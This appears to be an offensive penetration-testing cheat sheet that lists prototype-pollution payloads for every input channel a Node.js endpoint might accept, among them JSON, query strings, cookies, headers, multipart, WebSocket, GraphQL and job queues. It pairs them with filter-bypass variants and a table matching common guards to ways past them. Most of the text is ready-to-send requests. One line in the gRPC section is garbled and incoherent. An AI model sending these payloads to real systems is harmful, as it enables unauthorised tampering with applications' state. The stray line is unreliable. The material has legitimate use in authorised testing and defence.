# Carrier matrix — every way `__proto__` reaches the merge

The merge doesn't care how the `__proto__` key arrived. Each carrier
has its own parser that turns bytes into the nested shape the merge
consumes — enumerate the carriers the endpoint accepts, then send the
same pollution through each.

---

## 1. JSON body — the canonical carrier

```http
POST /api/profile HTTP/1.1
Content-Type: application/json

{"__proto__": {"marker": "pp1"}}
{"config": {"__proto__": {"marker": "pp1"}}}
{"config": {"constructor": {"prototype": {"marker": "pp1"}}}}
```

Variants that matter:

- **Depth**: `{"a":{"__proto__":...}}` vs `{"a":{"b":{"__proto__":...}}}`
  — a depth-0 filter misses the nested form.
- **Case**: `{"__PROTO__": ...}` — the setter is case-sensitive and
  won't fire, but a filter that lowercases-then-compares and a merge
  that uses the original bytes is a mismatch worth one probe.
- **Unicode escapes**: `{"__prot\u006f__": ...}` — `JSON.parse` decodes
  the escape to `__proto__`; a byte-level pre-parse filter misses it.
- **Duplicate keys**: `{"a":1,"__proto__":{"m":1},"a":2}` — parse order
  decides; some merges keep last, some first.
- **Array wrapper**: `[{"__proto__":{...}}]` — the merge that iterates
  an array of updates hits the same key.
- **The `__proto__` as VALUE**: `{"__proto__": "marker"}` — the setter
  gets a string (assigns `Object.prototype` to a primitive — usually
  a no-op or an error); object values are required for nested writes.

## 2. urlencoded form

```http
Content-Type: application/x-www-form-urlencoded

__proto__[marker]=1
config[__proto__][marker]=1
constructor[prototype][marker]=1
a[b][__proto__][marker]=1
```

Only parses to nested objects when `query parser` = `extended` (qs) —
express default is `simple` (querystring module) which keeps
`__proto__[marker]` a literal key name. The flat-vs-nested split is
the first probe: send both `__proto__.marker=1` and
`__proto__[marker]=1` and see which the response reflects.

## 3. Query string

```
GET /api/x?__proto__[marker]=1
GET /api/x?constructor[prototype][marker]=1
GET /api/x?a[b][__proto__][marker]=1
GET /api/x?__proto__.marker=1
GET /api/x?__proto__%5Bmarker%5D=1          — encoded brackets
GET /api/x?%5f%5fproto%5f%5f%5bmarker%5d=1  — encoded everything
```

Same qs rules as the form body. Also `?_=__proto__&x[...]` style
wrapper params when the endpoint takes a config param (`?config=`,
`?settings=`, `?opts=` — a JSON parse inside a param value:

`?settings={"__proto__":{"m":1}}`).

## 4. Cookie carrier

```
Cookie: prefs={"__proto__":{"m":1}}
Cookie: prefs=a[__proto__][m]=1
Cookie: theme={"constructor":{"prototype":{"m":1}}}
```

A cookie the app `JSON.parse`s and merges into a settings object —
theme/locale/layout cookies are the usual suspects. The cookie value
is the JSON string; URL-encode the braces if the cookie parser is
strict.

## 5. Header carrier

```
X-Config: {"__proto__":{"m":1}}
X-Theme: {"constructor":{"prototype":{"m":1}}}
X-Prefs: __proto__.m=1
```

Custom config headers that the app parses — rare, but `X-*-JSON`
headers are a real convention.

## 6. Multipart carrier

```
------b
Content-Disposition: form-data; name="__proto__.m"

1
------b
Content-Disposition: form-data; name="config[__proto__][m]"

1
------b
Content-Disposition: form-data; name="config"; filename="c.json"
Content-Type: application/json

{"__proto__":{"m":1}}
```

Field-name carries the path, or a JSON part carries the whole object.

## 7. WebSocket / SSE

```json
{"type": "settings", "data": {"__proto__": {"m": 1}}}
{"event": "update", "payload": {"config": {"__proto__": {"m": 1}}}}
```

Message-level fields merged into a per-connection or global state —
ws messages often skip HTTP middleware entirely; a `settings`-shaped
frame is a merge site nobody wrote a check on.

## 8. GraphQL

```graphql
mutation { updatePrefs(input: {theme: {__proto__: {m: 1}}}) { id } }
{"query": "...", "variables": {"input": {"__proto__": {"m": 1}}}}
```

The variables object is `JSON.parse`d — the same parser, same nested
key. Input-object fields that reach a settings merge are the sink.

## 9. gRPC / protobuf

Field names in a protobuf are declared — `__proto__` is not a declared
field. The pollution path is through a MAP-type field
(`map<string, Value>`) where the JSON transcoding of a map key
`__proto__` reaches a later merge; or through `Any`-packed payloads.
Artificial University: attribute assignment per field name — the
schema told you the names; `setattr` semantics differ per field type.

## 10. Server-to-server carrier

The polluted value arrives through a second hop:

- **SSRF-fetched JSON** merged into state — you control the fetched
  body's `__proto__` key.
- **Webhook payload** the app merges (`event.data` → settings).
- **Queue/job payload** (BullMQ, sidekiq): the job args merge into a
  worker's options — `{"data": {"__proto__": {...}}}` in a job create
  is a delayed pollution primitive.
- **Import endpoints** (`POST /import` accepting a JSON/CSV/INI file):
  the parsed rows merge into objects; `ini` files specifically had a
  `__proto__` section bug (`[__proto__]\nx=1` in `ini` <1.3.6).

## 11. The carrier-to-check table

| Carrier | Common guard | The bypass |
|---|---|---|
| JSON `__proto__` | key blacklist at depth 0 | nest it, or `constructor.prototype` |
| qs `__proto__[x]` | `simple` query parser (literal key) | — the parser is the wall; no bypass |
| cookie JSON | cookie-signature check | unsigned cookie conventions |
| GraphQL vars | schema type validation | `JSON`/`Any` scalar fields |
| multipart field | field-name allowlist | JSON file part instead of field name |
| ws message | none — middleware skipped | the whole carrier is the bypass |

## 12. Reading which carrier ran

The update's response or the error surface tells you:

- `415` → the content-type was rejected — another type may parse.
- `400` "invalid JSON" → the body reached a parser — shape the bytes.
- `200` but marker absent → carrier parsed, merge didn't sink — the
  MERGE is the wall, not the carrier.
- `marker` on the written doc but not on fresh objects → local write;
  the carrier worked, the merge is shallow.
